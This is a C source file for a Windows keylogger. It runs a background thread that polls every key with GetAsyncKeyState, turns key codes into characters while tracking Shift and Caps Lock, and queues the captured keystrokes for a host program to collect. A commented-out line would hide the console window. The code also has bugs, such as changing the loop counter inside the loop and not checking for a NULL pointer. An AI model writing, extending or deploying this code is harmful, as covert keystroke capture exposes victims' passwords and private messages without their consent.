#include <windows.h>
#include <stdio.h>
#include "keylogger.h"

/*
    Loop through each key see if it is pressed. Program will cause CPU to rise quickly. (Test 25% cpu used)
*/

///////////////////////////////////////////////////////////////////////////
// Use queue to store keys pressed. Main function can then grab keylogs from the queue.
struct QNodeKeylog* newNodeKeylog(char* data)
{
		struct QNodeKeylog* tmp = (struct QNodeKeylog*)malloc(sizeof(struct QNodeKeylog));
		strcpy(tmp->data,data);
		tmp->next = NULL;
		return tmp;
}

int EnqueueKeylog(struct QueueKeylog* q, char* data)
{
	//new node
	struct QNodeKeylog* tmp = newNodeKeylog(data);

	//empty queue
	if(q->rear == NULL)
	{
		q->front = q->rear = tmp;
		return 0;
	}

	// add new node to end of queue
	q->rear->next = tmp;
	//set new node to rear
	q->rear = tmp;
	return 0;
}

struct QNodeKeylog* DequeueKeylog(struct QueueKeylog* q)
{
	if(q->front == NULL)
		return NULL;
	struct QNodeKeylog* tmp = q->front;
	q->front = q->front->next;

	if(q->front == NULL)
		q->rear = NULL;
	return tmp;
}

struct QueueKeylog* createQueueKeylog()
{
	struct QueueKeylog* q = (struct QueueKeylog*)malloc(sizeof(struct QueueKeylog));
	q->front = q->rear = NULL;
	return q;
}
///////////////////////////////////////////////////////////////////////////
//Thread that starts keylogger
DWORD WINAPI threadKeylog(void* arg)
{
	struct QueueKeylog* q = arg;
	keylog(q);
	return 0;
}
///////////////////////////////////////////////////////////////////////////
//start keylogger thread
HANDLE startKeylogger(struct QueueKeylog* q)
{
	//start key logger
	HANDLE thread = CreateThread(NULL, 0, threadKeylog, q, 0, NULL);
	return thread;
}
int getKeylog(struct QueueKeylog* q,char* key)
{
	struct QNodeKeylog* keypointer;

	keypointer = DequeueKeylog(q);
	if(keypointer->data != NULL)
	{
		strcpy(key,keypointer->data);
		free(keypointer);
		keypointer = NULL;
		return 1;
	}
	else
	{
		return 0;
	}
}
///////////////////////////////////////////////////////////////////////////
//Keylogger function
void keylog(struct QueueKeylog* q)
{
	//https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
	char* virtualKeyCodes[] = {"","<Left-Mouse>;","<Right-Mouse>;","<Cancel>;","<Middle-Mouse>;","<X1-Mouse>;",
	"<X2-Mouse>;","","<BackSpace>;","	","","","<Clear>;","<Enter>;","","","<Shift>;","<CTRL>;","<ALT>;",
	"<Pause>;","<Caps-Lock>;","<IME-Hangul-Mode>;","","<IME-Junja>;","<IME-Final>;","<IME-Hanja>;",
	"","<ESC>;","<IME-Conver>;","<IME-NonConver>;","<IME-Accept>;","<IME-Mode-Change-Request>;"," ","<Page-Up>;",
	"<Page-Down>;","<End>;","<Home-Key>;","<Left-Arrow>;","<Up-Arrow>;","<Right-Arrow>;","<Down-Arrow>;",
	"<Select>;","<Print-Key>;","<Execute-Key>;","<Print-Screen>;","<INS>;","<Delete>;","<Help>;","0",
	"1","2","3","4","5","6","7","8","9","","","","","","","","a","b","c","d","e","f","g","h","i","j","k",
	"l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","<Left-Windows-Key>;","<Right-Windows-Key>;","<Application-Key>;",
	"","<Computer-Sleep>;","0","1","2","3","4","5","6","7","8","9","*","+","|","-",".","/","<F1>;","<F2>;","<F3>;","<F4>;",
	"<F5>;","<F6>;","<F7>;","<F8>;","<F9>;","<F10>;","<F11>;","<F12>;","<F13>;","<F14>;","<F15>;","<F16>;","<F17>;","<F18>;",
	"<F19>;","<F20>;","<F21>;","<F22>;","<F23>;","<F24>;","","","","","","","","","<Num-Lock>;",
	"<Scroll-Lock>;","","","","","","","","","","","","","","","","","","<Control>;","<Control>;","<Menue>;","<Menue>;",
	"<Browser Back>;","<Browser Forward>;","<Browser Refresh>;","<Browser Stop>;","<Browser Search>;","<Browser Favorite>;",
	"<Browser Home>;","<Volume Mute>;","<Volume Down>;","<Volume Up>;", "<New Track>;","<Previous Track>;",
	"<Play/Pause>;","<Start Mail>;","<Select Media>;","<Start Application 1>;","<Start Application 2>;",
	NULL,NULL,";","=",",","-",".","/","`","","","","","","","","","","","","","","","","","","","","","","","","","","","[",
	"\\","]","'","","","","< [ OR / >;","","","<IME-Process>;","","","","","","","","","","","","","","","",
	"<Attn>;", "<CrSel>;","<ExSel>;","<Erase>;","<Play>;","<Zoom>;","","<PA1>;","<Clear>;"};

	char* virtualKeyCodesUpercase[] = {"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V",
	"W","X","Y","Z"};
	char* virtualKeyCodesShiftNum[] = {")","!","@","#","$","%","^","&","*","("};
	char* virtualKeyCodesShiftSpecialOne[] = {":","+","<","_",">","?","~"};
	char* virtualKeyCodesShiftSpecialTwo[] = {"{","|","}","\""};

	int virtualKeyCodesSize = sizeof(virtualKeyCodes) / sizeof(char *); // get number of elements in array
	int i = 1; //Loop Counter Vkeys
	int j = 0; // holds value of  i
	char* key; //virtualKeyCodes index value
	int capsOn = 0; //Cap lock is toogled
	int shiftOn = 0; // Shift is being pressed
	int shiftPressed; // Check if shift is pressed

	while(1)
	{
		//ShowWindow(GetConsoleWindow(), SW_HIDE);
		for(i=1;i<255;i++)
		{
			//https://msdn.microsoft.com/en-us/library/windows/desktop/ms646293(v=vs.85).aspx
			//get key press
			if(GetAsyncKeyState(i) == -32767) // 1 = press , -32767 = held down
			{
				//https://msdn.microsoft.com/en-us/library/windows/desktop/ms646301(v=vs.85).aspx
				// check if CAP Lock is on
				capsOn = GetKeyState(VK_CAPITAL);

				//check if Shift is pressed
				shiftOn = 0;
				shiftPressed = GetKeyState(VK_SHIFT);
				if(shiftPressed  == -127 || shiftPressed == -128)
				{
						shiftOn = 1;
				}


                // capital letters
                if((capsOn && !shiftOn && i <= 90 && i >=65) || (shiftOn && !capsOn && i <= 90 && i >=65))
                {
                    i -= 65; //adjust i to new array
                    EnqueueKeylog(q,virtualKeyCodesUpercase[i]);
                }
                //Shift Number EX:!@#$%^&*()
                else if(shiftOn &&  i <= 57 && i >=48)
                {
                    i -= 48; //adjust i to new array
                    EnqueueKeylog(q,virtualKeyCodesShiftNum[i]);
                }

                else if(shiftOn &&  i <= 192 && i >= 186)
                {
                    i -= 186; //adjust i to new array
                    EnqueueKeylog(q,virtualKeyCodesShiftSpecialOne[i]);
                }

                else if(shiftOn &&  i <= 222 && i >=219)
                {
                    i -= 219; //adjust i to new array
                    EnqueueKeylog(q,virtualKeyCodesShiftSpecialTwo[i]);
                }

                //regular characters
                else
                {
                    EnqueueKeylog(q,virtualKeyCodes[i]);
                }
			}
		}
	}
}
